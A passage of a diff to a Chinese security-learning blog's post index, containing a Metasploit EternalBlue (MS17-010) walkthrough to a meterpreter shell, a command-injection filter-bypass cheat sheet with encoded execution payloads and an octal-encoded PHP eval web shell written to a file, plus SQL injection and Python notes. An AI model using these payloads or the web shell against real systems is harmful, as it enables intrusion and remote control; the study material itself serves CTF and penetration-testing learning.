-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
-<p>可以看到启动成功</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/48d56f67680718424465ea602dd0b4bc.png" alt="Snipaste_2020-12-23_16-44-28.png"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">search ms17_010</span><br></pre></td></tr></table></figure>
-<p>看一看利用的模块</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/078b80f52bdc70d8443115a7547956c0.png" alt="Snipaste_2020-12-23_16-45-43.png"></p>
-<p>可以先使用辅助模块 auxliar 进行辅助看看是否存在这个漏洞利用</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010   </span><br></pre></td></tr></table></figure>
-<p><code>options</code>看一下我们需要设置什么payload</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/827f318393361849c45c568110a357ee.png" alt="Snipaste_2020-12-23_16-49-18.png"></p>
-<p>可以看到我们需要设置攻击的ip</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set rhosts 192.168.94.130</span><br></pre></td></tr></table></figure>
-<p>然后 <code>run</code>  或者 <code>exploit</code></p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/db8072a9eefb03c5da1b3e70b645bb84.png" alt="Snipaste_2020-12-23_16-50-25.png"></p>
-<p>可以看到 可能存在ms17_010漏洞</p>
-<p>接下来我们使用 exploit模块进行 漏洞利用getshell</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue </span><br></pre></td></tr></table></figure>
-<p>然后 <code>set payload</code> 可以看到我们只需要设置 rhosts就行了</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/813e501f2dd4a2075a3fb7faa6383bc5.png" alt="Snipaste_2020-12-23_16-57-27.png"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set rhosts 192.168.94.130</span><br></pre></td></tr></table></figure>
-<p>然后run</p>
-<p>可以看到成功了 进行的是meterpreter了</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/91b6d69faf090b7300ab9176cf8f7dcb.png" alt="Snipaste_2020-12-23_17-01-44.png"></p>
-<p>输入shell 可以看到我们成功进入了目标机的cmd了</p>
-<p>ipconfig可以看到一些信息</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/0da1dd8e0e5dce75d300652f86564312.png" alt="Snipaste_2020-12-23_17-05-03.png"></p>
-<p><strong>tip:</strong></p>
-<p>cmd中文乱码可以使用 <code>chcp 65001</code> 修改编码 部分中文能成功显示</p>
-<p>在meterpreter可以使用 background放入后台进程</p>
-<p>sessions 命令可以看后台进程</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/52ffa7da36dd2bb68e6094f732b33df3.png" alt="Snipaste_2020-12-23_17-03-38.png"></p>
-<p><strong>其它后渗透参考</strong>  <a href="https://blog.csdn.net/p_utao/article/details/108381939">https://blog.csdn.net/p_utao/article/details/108381939</a></p>
-]]></content>
-      <categories>
-        <category>渗透测试</category>
-        <category>msf利用</category>
       </categories>
   </entry>
   <entry>
@@ -961,6 +815,90 @@ payload: cat flag.php||</p>
       </categories>
   </entry>
   <entry>
+    <title>ping命令执行及bypass</title>
+    <url>/2020/11/27/ping%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%8F%8Abypass/</url>
+    <content><![CDATA[<p>常见bypass及一些奇淫技巧</p>
+<a id="more"></a>
+<h2 id="管道符"><a class="header-anchor" href="#管道符">¶</a>管道符</h2>
+<h3 id="windows-下"><a class="header-anchor" href="#windows-下">¶</a>windows 下</h3>
+<blockquote>
+<p><code>|</code>直接执行后面的语句<br>
+<code>||</code>如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br>
+<code>&amp;</code>前面和后面命令都要执行，无论前面真假<br>
+<code>&amp;&amp;</code>如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</p>
+</blockquote>
+<h3 id="Linux-下"><a class="header-anchor" href="#Linux-下">¶</a>Linux 下</h3>
+<blockquote>
+<p><code>;</code>前面和后面命令都要执行，无论前面真假<br>
+<code>|</code>直接执行后面的语句<br>
+<code>||</code>如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br>
+<code>&amp;</code>前面和后面命令都要执行，无论前面真假<br>
+<code>&amp;&amp;</code>如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</p>
+</blockquote>
+<h2 id="命令分割符被过滤"><a class="header-anchor" href="#命令分割符被过滤">¶</a>命令分割符被过滤</h2>
+<p>使用下面两个</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%0a换行符，需要php环境</span><br><span class="line">%0d回车符，需要php环境</span><br></pre></td></tr></table></figure>
+<h2 id="空格绕过"><a class="header-anchor" href="#空格绕过">¶</a>空格绕过</h2>
+<p>常见的绕过符号有： $IFS$9 、${IFS} 、%09(php环境下)、 重定向符&lt;&gt;、&gt;<br>
+$IFS在linux下表示分隔符，如果不加{}则bash会将IFS解释为一个变量名，<br>
+加一个{}就固定了变量名，$IFS$9后面之所以加个$是为了起到截断的作用 ;为什么要用$9呢，因为$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串。<br>
+不仅 $9可以使用，我试了试其他的数字也都可以正确绕过。</p>
+<h2 id="过滤目录分隔符"><a class="header-anchor" href="#过滤目录分隔符">¶</a>过滤目录分隔符</h2>
+<p>目录分隔符<code>/</code>我们可以使用<code>$HOME</code>代替，HOME也是shell中的一个环境变量，表示当前用户的根目录，我们可以看看当前用户的HOME值是什么</p>
+<p><a href="https://imgchr.com/i/sCegiD"><img src="https://s3.ax1x.com/2021/01/03/sCegiD.png" alt="sCegiD.png"></a></p>
+<p>可以看到当前用户的根目录是/home/www-data，我们只需要/，所以我们可以用${HOME:0:1}来实现</p>
+<h2 id="关键词过滤"><a class="header-anchor" href="#关键词过滤">¶</a>关键词过滤</h2>
+<h3 id="单引号绕过"><a class="header-anchor" href="#单引号绕过">¶</a>单引号绕过</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">w&#39;h&#39;o&#39;am&#39;i</span><br></pre></td></tr></table></figure>
+<h3 id="双引号绕过"><a class="header-anchor" href="#双引号绕过">¶</a>双引号绕过</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">w&quot;h&quot;o&quot;am&quot;i</span><br></pre></td></tr></table></figure>
+<h3 id="反斜线"><a class="header-anchor" href="#反斜线">¶</a>反斜线</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c\at fl\ag</span><br></pre></td></tr></table></figure>
+<h3 id="正则-假设-bin-cat-test-是一个目录"><a class="header-anchor" href="#正则-假设-bin-cat-test-是一个目录">¶</a>正则 (假设/bin/cat: test: 是一个目录)</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;???&#x2F;?[a][t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;&#96;</span><br><span class="line">&#96;&#x2F;???&#x2F;?at ????&#96;</span><br><span class="line">&#96;&#x2F;???&#x2F;?[a]&#39;&#39;[t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;</span><br></pre></td></tr></table></figure>
+<h3 id="使用-绕过"><a class="header-anchor" href="#使用-绕过">¶</a>使用 $@ 绕过</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">who$@ami</span><br></pre></td></tr></table></figure>
+<h3 id="用通配符绕过"><a class="header-anchor" href="#用通配符绕过">¶</a>用通配符绕过</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell C:\*\*2\n??e*d.*? # notepad</span><br></pre></td></tr></table></figure>
+<h3 id="cat被过滤"><a class="header-anchor" href="#cat被过滤">¶</a>cat被过滤</h3>
+<blockquote>
+<p>more:一页一页的显示档案内容<br>
+less:与 more 类似<br>
+head:查看头几行<br>
+tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br>
+tail:查看尾几行<br>
+nl：显示的时候，顺便输出行号<br>
+od:以二进制的方式读取档案内容<br>
+vi:一种编辑器，这个也可以查看<br>
+vim:一种编辑器，这个也可以查看<br>
+sort:可以查看<br>
+uniq:可以查看<br>
+file -f:报错出具体内容</p>
+</blockquote>
+<h2 id="命令执行函数被过滤"><a class="header-anchor" href="#命令执行函数被过滤">¶</a>命令执行函数被过滤</h2>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">system()</span><br><span class="line">passthru()</span><br><span class="line">exec()</span><br><span class="line">shell_exec()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br><span class="line">pcntl_exec()</span><br><span class="line">反引号 同shell_exec() </span><br></pre></td></tr></table></figure>
+<h2 id="利用编码绕过"><a class="header-anchor" href="#利用编码绕过">¶</a>利用编码绕过</h2>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#base64</span><br><span class="line">echo Y2F0IC9mbGFn|base64 -d|bash &#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line">echo Y2F0IC9mbGFn|base64 -d|sh&#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line">echo Y2F0IGZsYWcucGhw|base64 -d|bash&#x3D;&#x3D;&gt;cat flag.php</span><br><span class="line">echo Y2F0IGZsYWcucGhw|base64 -d|sh&#x3D;&#x3D;&gt;cat flag.php</span><br><span class="line">#hex</span><br><span class="line">echo &quot;0x636174202f666c6167&quot; | xxd -r -p|bash &#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line">#oct&#x2F;字节</span><br><span class="line">$(printf &quot;\154\163&quot;) &#x3D;&#x3D;&gt;ls</span><br><span class="line">$(printf &quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;) &#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line">&#123;printf,&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;&#125;|\$0 &#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line">#i也可以通过这种方式写马</span><br><span class="line">内容为&lt;?php @eval($_POST[&#39;c&#39;]);?&gt;</span><br><span class="line">$&#123;printf,&quot;\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&quot;&#125; &gt;&gt; 1.php</span><br></pre></td></tr></table></figure>
+<h2 id="奇淫妓巧"><a class="header-anchor" href="#奇淫妓巧">¶</a>奇淫妓巧</h2>
+<h3 id="内联执行执行"><a class="header-anchor" href="#内联执行执行">¶</a>内联执行执行</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat$IFS$9&#96;ls&#96;</span><br><span class="line">cat$IFS$9$(ls)</span><br><span class="line">这两个命令也意思就是执行当前目录下的所有文件</span><br></pre></td></tr></table></figure>
+<p><strong>(内联，就是将``或$()内命令的输出作为输入执行)</strong></p>
+<hr>
+<h3 id="利用ls-t和-以及换行符绕过长度限制执行命令-文件构造绕过"><a class="header-anchor" href="#利用ls-t和-以及换行符绕过长度限制执行命令-文件构造绕过">¶</a>利用ls -t和&gt;以及换行符绕过长度限制执行命令(文件构造绕过)</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;桌面# echo &quot;flag&#123;hahaha&#125;&quot; &gt; flag.txt</span><br><span class="line">root@kali:~&#x2F;桌面# touch &quot;ag&quot;</span><br><span class="line">root@kali:~&#x2F;桌面# touch &quot;fl\\&quot;</span><br><span class="line">root@kali:~&#x2F;桌面# touch &quot;t \\&quot;</span><br><span class="line">root@kali:~&#x2F;桌面# touch &quot;ca\\&quot;</span><br><span class="line">root@kali:~&#x2F;桌面# ls -t</span><br><span class="line">&#39;ca\&#39;  &#39;t \&#39;  &#39;fl\&#39;   ag   flag</span><br><span class="line">root@kali:~&#x2F;桌面# ls -t &gt;a     #将 ls -t 内容写入到a文件中</span><br><span class="line">root@kali:~&#x2F;桌面# sh a</span><br><span class="line">a: 1: a: not found</span><br><span class="line">flag&#123;hahaha&#125;</span><br><span class="line">a: 6: flag.txt: not found</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\ 是指换行</span><br><span class="line">ls -t将文件按时间排序输出</span><br><span class="line">sh命令可以从一个文件中读取命令来执行</span><br></pre></td></tr></table></figure>
+<p><strong>参考博客</strong>  <a href="https://www.cnblogs.com/NPFS/p/13279815.html">https://www.cnblogs.com/NPFS/p/13279815.html</a></p>
+<p>​                 <a href="https://www.cnblogs.com/micr067/p/12590152.html">https://www.cnblogs.com/micr067/p/12590152.html</a></p>
+<p>​                 <a href="https://blog.csdn.net/qq_45552960/article/details/104576189">https://blog.csdn.net/qq_45552960/article/details/104576189</a></p>
+<p>​                 <a href="https://blog.csdn.net/qq_42812036/article/details/104297163">https://blog.csdn.net/qq_42812036/article/details/104297163</a></p>
+<p>​                 <a href="https://www.freesion.com/article/9046720644/">https://www.freesion.com/article/9046720644/</a></p>
+]]></content>
+      <categories>
+        <category>web技术学习</category>
+        <category>命令执行</category>
+      </categories>
+  </entry>
+  <entry>
     <title>php伪随机数漏洞</title>
     <url>/2020/10/10/php%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/</url>
     <content><![CDATA[<p>针对ctf中伪随机数漏洞利用的小结</p>
@@ -999,6 +937,27 @@ payload: cat flag.php||</p>
       <categories>
         <category>web技术学习</category>
         <category>php伪随机数漏洞</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>python之字符串前面加u,r,f的含义</title>
+    <url>/2021/01/08/python%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%89%8D%E9%9D%A2%E5%8A%A0u,r,f%E7%9A%84%E5%90%AB%E4%B9%89/</url>
+    <content><![CDATA[<p>版本 python3.6及以上</p>
+<a id="more"></a>
+<p><strong>1.u:表示unicode字符串</strong><br>
+字符串中存在中文的字符，在前面加上u</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a &#x3D; u&#39;这是一个中文的字符串。&#39;</span><br></pre></td></tr></table></figure>
+<p><strong>2.r:表示非转义的原始字符串</strong><br>
+字符串中存在\，要让它失效，要在前面加上r</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  print(r&#39;今天是七夕节,\n但是还是要加班！&#39;) #加上r就是\不转义</span><br><span class="line">  今天是七夕节,\n但是还是要加班！</span><br><span class="line">  </span><br><span class="line">print(&#39;今天是七夕节,\t但是还是要加班！&#39;)  #不加上r就是\转义</span><br><span class="line">今天是七夕节,	但是还是要加班！</span><br></pre></td></tr></table></figure>
+<p><strong>3.f:表示在字符串内支持大括号内的python 表达式</strong></p>
+<p>f-strings 是指以 f 或 F 开头的字符串，其中以 {} 包含的表达式会进行值替换。（目前支持python3.6版本）</p>
+<p>下面看下 f-strings 的使用方法</p>
+<p>基本使用（作用：替换值）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;name &#x3D; &#39;hoxis&#39;</span><br><span class="line">&gt;&gt;&gt; age &#x3D; 18</span><br><span class="line">&gt;&gt;&gt; f&quot;hi, &#123;name&#125;, are you &#123;age&#125;&quot;</span><br><span class="line">#结果如下</span><br><span class="line">&#39;hi, hoxis, are you 18&#39;</span><br><span class="line">&gt;&gt;&gt; F&quot;hi, &#123;name&#125;, are you &#123;age&#125;&quot;</span><br><span class="line">&#39;hi, hoxis, are you 18&#39;</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>编程学习</category>
+        <category>python</category>
       </categories>
   </entry>
   <entry>
@@ -1108,373 +1067,6 @@ payload: cat flag.php||</p>
       <categories>
         <category>web技术学习</category>
         <category>命令执行</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>ping命令执行及bypass</title>
-    <url>/2020/11/27/ping%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%8F%8Abypass/</url>
-    <content><![CDATA[<p>常见bypass及一些奇淫技巧</p>
-<a id="more"></a>
-<h2 id="管道符"><a class="header-anchor" href="#管道符">¶</a>管道符</h2>
-<h3 id="windows-下"><a class="header-anchor" href="#windows-下">¶</a>windows 下</h3>
-<blockquote>
-<p><code>|</code>直接执行后面的语句<br>
-<code>||</code>如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br>
-<code>&amp;</code>前面和后面命令都要执行，无论前面真假<br>
-<code>&amp;&amp;</code>如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</p>
-</blockquote>
-<h3 id="Linux-下"><a class="header-anchor" href="#Linux-下">¶</a>Linux 下</h3>
-<blockquote>
-<p><code>;</code>前面和后面命令都要执行，无论前面真假<br>
-<code>|</code>直接执行后面的语句<br>
-<code>||</code>如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br>
-<code>&amp;</code>前面和后面命令都要执行，无论前面真假<br>
-<code>&amp;&amp;</code>如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</p>
-</blockquote>
-<h2 id="命令分割符被过滤"><a class="header-anchor" href="#命令分割符被过滤">¶</a>命令分割符被过滤</h2>
-<p>使用下面两个</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%0a换行符，需要php环境</span><br><span class="line">%0d回车符，需要php环境</span><br></pre></td></tr></table></figure>
-<h2 id="空格绕过"><a class="header-anchor" href="#空格绕过">¶</a>空格绕过</h2>
-<p>常见的绕过符号有： $IFS$9 、${IFS} 、%09(php环境下)、 重定向符&lt;&gt;、&gt;<br>
-$IFS在linux下表示分隔符，如果不加{}则bash会将IFS解释为一个变量名，<br>
-加一个{}就固定了变量名，$IFS$9后面之所以加个$是为了起到截断的作用 ;为什么要用$9呢，因为$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串。<br>
-不仅 $9可以使用，我试了试其他的数字也都可以正确绕过。</p>
-<h2 id="过滤目录分隔符"><a class="header-anchor" href="#过滤目录分隔符">¶</a>过滤目录分隔符</h2>
-<p>目录分隔符<code>/</code>我们可以使用<code>$HOME</code>代替，HOME也是shell中的一个环境变量，表示当前用户的根目录，我们可以看看当前用户的HOME值是什么</p>
-<p><a href="https://imgchr.com/i/sCegiD"><img src="https://s3.ax1x.com/2021/01/03/sCegiD.png" alt="sCegiD.png"></a></p>
-<p>可以看到当前用户的根目录是/home/www-data，我们只需要/，所以我们可以用${HOME:0:1}来实现</p>
-<h2 id="关键词过滤"><a class="header-anchor" href="#关键词过滤">¶</a>关键词过滤</h2>
-<h3 id="单引号绕过"><a class="header-anchor" href="#单引号绕过">¶</a>单引号绕过</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">w&#39;h&#39;o&#39;am&#39;i</span><br></pre></td></tr></table></figure>
-<h3 id="双引号绕过"><a class="header-anchor" href="#双引号绕过">¶</a>双引号绕过</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">w&quot;h&quot;o&quot;am&quot;i</span><br></pre></td></tr></table></figure>
-<h3 id="反斜线"><a class="header-anchor" href="#反斜线">¶</a>反斜线</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c\at fl\ag</span><br></pre></td></tr></table></figure>
-<h3 id="正则-假设-bin-cat-test-是一个目录"><a class="header-anchor" href="#正则-假设-bin-cat-test-是一个目录">¶</a>正则 (假设/bin/cat: test: 是一个目录)</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;???&#x2F;?[a][t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;&#96;</span><br><span class="line">&#96;&#x2F;???&#x2F;?at ????&#96;</span><br><span class="line">&#96;&#x2F;???&#x2F;?[a]&#39;&#39;[t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;</span><br></pre></td></tr></table></figure>
-<h3 id="使用-绕过"><a class="header-anchor" href="#使用-绕过">¶</a>使用 $@ 绕过</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">who$@ami</span><br></pre></td></tr></table></figure>
-<h3 id="用通配符绕过"><a class="header-anchor" href="#用通配符绕过">¶</a>用通配符绕过</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell C:\*\*2\n??e*d.*? # notepad</span><br></pre></td></tr></table></figure>
-<h3 id="cat被过滤"><a class="header-anchor" href="#cat被过滤">¶</a>cat被过滤</h3>
-<blockquote>
-<p>more:一页一页的显示档案内容<br>
-less:与 more 类似<br>
-head:查看头几行<br>
-tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br>
-tail:查看尾几行<br>
-nl：显示的时候，顺便输出行号<br>
-od:以二进制的方式读取档案内容<br>
-vi:一种编辑器，这个也可以查看<br>
-vim:一种编辑器，这个也可以查看<br>
-sort:可以查看<br>
-uniq:可以查看<br>
-file -f:报错出具体内容</p>
-</blockquote>
-<h2 id="命令执行函数被过滤"><a class="header-anchor" href="#命令执行函数被过滤">¶</a>命令执行函数被过滤</h2>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">system()</span><br><span class="line">passthru()</span><br><span class="line">exec()</span><br><span class="line">shell_exec()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br><span class="line">pcntl_exec()</span><br><span class="line">反引号 同shell_exec() </span><br></pre></td></tr></table></figure>
-<h2 id="利用编码绕过"><a class="header-anchor" href="#利用编码绕过">¶</a>利用编码绕过</h2>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#base64</span><br><span class="line">echo Y2F0IC9mbGFn|base64 -d|bash &#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line">echo Y2F0IC9mbGFn|base64 -d|sh&#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line">echo Y2F0IGZsYWcucGhw|base64 -d|bash&#x3D;&#x3D;&gt;cat flag.php</span><br><span class="line">echo Y2F0IGZsYWcucGhw|base64 -d|sh&#x3D;&#x3D;&gt;cat flag.php</span><br><span class="line">#hex</span><br><span class="line">echo &quot;0x636174202f666c6167&quot; | xxd -r -p|bash &#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line">#oct&#x2F;字节</span><br><span class="line">$(printf &quot;\154\163&quot;) &#x3D;&#x3D;&gt;ls</span><br><span class="line">$(printf &quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;) &#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line">&#123;printf,&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;&#125;|\$0 &#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line">#i也可以通过这种方式写马</span><br><span class="line">内容为&lt;?php @eval($_POST[&#39;c&#39;]);?&gt;</span><br><span class="line">$&#123;printf,&quot;\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&quot;&#125; &gt;&gt; 1.php</span><br></pre></td></tr></table></figure>
-<h2 id="奇淫妓巧"><a class="header-anchor" href="#奇淫妓巧">¶</a>奇淫妓巧</h2>
-<h3 id="内联执行执行"><a class="header-anchor" href="#内联执行执行">¶</a>内联执行执行</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat$IFS$9&#96;ls&#96;</span><br><span class="line">cat$IFS$9$(ls)</span><br><span class="line">这两个命令也意思就是执行当前目录下的所有文件</span><br></pre></td></tr></table></figure>
-<p><strong>(内联，就是将``或$()内命令的输出作为输入执行)</strong></p>
-<hr>
-<h3 id="利用ls-t和-以及换行符绕过长度限制执行命令-文件构造绕过"><a class="header-anchor" href="#利用ls-t和-以及换行符绕过长度限制执行命令-文件构造绕过">¶</a>利用ls -t和&gt;以及换行符绕过长度限制执行命令(文件构造绕过)</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;桌面# echo &quot;flag&#123;hahaha&#125;&quot; &gt; flag.txt</span><br><span class="line">root@kali:~&#x2F;桌面# touch &quot;ag&quot;</span><br><span class="line">root@kali:~&#x2F;桌面# touch &quot;fl\\&quot;</span><br><span class="line">root@kali:~&#x2F;桌面# touch &quot;t \\&quot;</span><br><span class="line">root@kali:~&#x2F;桌面# touch &quot;ca\\&quot;</span><br><span class="line">root@kali:~&#x2F;桌面# ls -t</span><br><span class="line">&#39;ca\&#39;  &#39;t \&#39;  &#39;fl\&#39;   ag   flag</span><br><span class="line">root@kali:~&#x2F;桌面# ls -t &gt;a     #将 ls -t 内容写入到a文件中</span><br><span class="line">root@kali:~&#x2F;桌面# sh a</span><br><span class="line">a: 1: a: not found</span><br><span class="line">flag&#123;hahaha&#125;</span><br><span class="line">a: 6: flag.txt: not found</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\ 是指换行</span><br><span class="line">ls -t将文件按时间排序输出</span><br><span class="line">sh命令可以从一个文件中读取命令来执行</span><br></pre></td></tr></table></figure>
-<p><strong>参考博客</strong>  <a href="https://www.cnblogs.com/NPFS/p/13279815.html">https://www.cnblogs.com/NPFS/p/13279815.html</a></p>
-<p>​                 <a href="https://www.cnblogs.com/micr067/p/12590152.html">https://www.cnblogs.com/micr067/p/12590152.html</a></p>
-<p>​                 <a href="https://blog.csdn.net/qq_45552960/article/details/104576189">https://blog.csdn.net/qq_45552960/article/details/104576189</a></p>
-<p>​                 <a href="https://blog.csdn.net/qq_42812036/article/details/104297163">https://blog.csdn.net/qq_42812036/article/details/104297163</a></p>
-<p>​                 <a href="https://www.freesion.com/article/9046720644/">https://www.freesion.com/article/9046720644/</a></p>
-]]></content>
-      <categories>
-        <category>web技术学习</category>
-        <category>命令执行</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>python之字符串前面加u,r,f的含义</title>
-    <url>/2021/01/08/python%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%89%8D%E9%9D%A2%E5%8A%A0u,r,f%E7%9A%84%E5%90%AB%E4%B9%89/</url>
-    <content><![CDATA[<p>版本 python3.6及以上</p>
-<a id="more"></a>
-<p><strong>1.u:表示unicode字符串</strong><br>
-字符串中存在中文的字符，在前面加上u</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a &#x3D; u&#39;这是一个中文的字符串。&#39;</span><br></pre></td></tr></table></figure>
-<p><strong>2.r:表示非转义的原始字符串</strong><br>
-字符串中存在\，要让它失效，要在前面加上r</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  print(r&#39;今天是七夕节,\n但是还是要加班！&#39;) #加上r就是\不转义</span><br><span class="line">  今天是七夕节,\n但是还是要加班！</span><br><span class="line">  </span><br><span class="line">print(&#39;今天是七夕节,\t但是还是要加班！&#39;)  #不加上r就是\转义</span><br><span class="line">今天是七夕节,	但是还是要加班！</span><br></pre></td></tr></table></figure>
-<p><strong>3.f:表示在字符串内支持大括号内的python 表达式</strong></p>
-<p>f-strings 是指以 f 或 F 开头的字符串，其中以 {} 包含的表达式会进行值替换。（目前支持python3.6版本）</p>
-<p>下面看下 f-strings 的使用方法</p>
-<p>基本使用（作用：替换值）</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;name &#x3D; &#39;hoxis&#39;</span><br><span class="line">&gt;&gt;&gt; age &#x3D; 18</span><br><span class="line">&gt;&gt;&gt; f&quot;hi, &#123;name&#125;, are you &#123;age&#125;&quot;</span><br><span class="line">#结果如下</span><br><span class="line">&#39;hi, hoxis, are you 18&#39;</span><br><span class="line">&gt;&gt;&gt; F&quot;hi, &#123;name&#125;, are you &#123;age&#125;&quot;</span><br><span class="line">&#39;hi, hoxis, are you 18&#39;</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>编程学习</category>
-        <category>python</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>sql注入之mysql学习基础(一)</title>
-    <url>/2021/01/05/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bmysql%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80(%E4%B8%80)/</url>
-    <content><![CDATA[<p>了解什么是sql注入及mysql数据库介绍</p>
-<a id="more"></a>
-<h1>MySQL的数据库结构</h1>
-<p><a href="https://imgchr.com/i/sAaGcQ"><img src="https://s3.ax1x.com/2021/01/05/sAaGcQ.png" alt="sAaGcQ.png"></a></p>
-<h1>注入的产生</h1>
-<p><a href="https://imgchr.com/i/sAalh8"><img src="https://s3.ax1x.com/2021/01/05/sAalh8.png" alt="sAalh8.png"></a></p>
-<p>id变量通过get方式获取并且直接拼接到SQL语句中，而id参数用户可控，造成注入</p>
-<h1>MySQL5注入的一般流程</h1>
-<p>获取字段数-查库名-查表名-查列名-查数据</p>
-<p>获取字段数：order by 临界值<br>
-获取库名：database()<br>
-表名和列名没有内置函数 怎么查？</p>
-<p>union语句：将不同表的两个列查询的数据去重拼接<br>
-union all ：不去重</p>
-<p>获取MySQL版本：version()<br>
-MySQL5.0以下版本只能和access数据库一样猜解<br>
-而MySQL5.0以上版本内置了information_schema库，存储了所有的数据库名、表名、列名<br>
-information_schema.tables 记录表名信息<br>
-information_schema.columns 记录列名信息<br>
-TABLE_SCHEMA 数据库字段<br>
-table_name 表名<br>
-column_name 列名<br>
-查表名：<br>
-SELECT table_name FROM information_schema.tables where TABLE_SCHEMA=database();<br>
-查列名：<br>
-SELECT column_name FROM information_schema.columns where TABLE_name=‘users’;<br>
-查数据：<br>
-select 列名 from 库名.表名</p>
-]]></content>
-      <categories>
-        <category>web技术学习</category>
-        <category>sql注入</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>python正则表达式和re库</title>
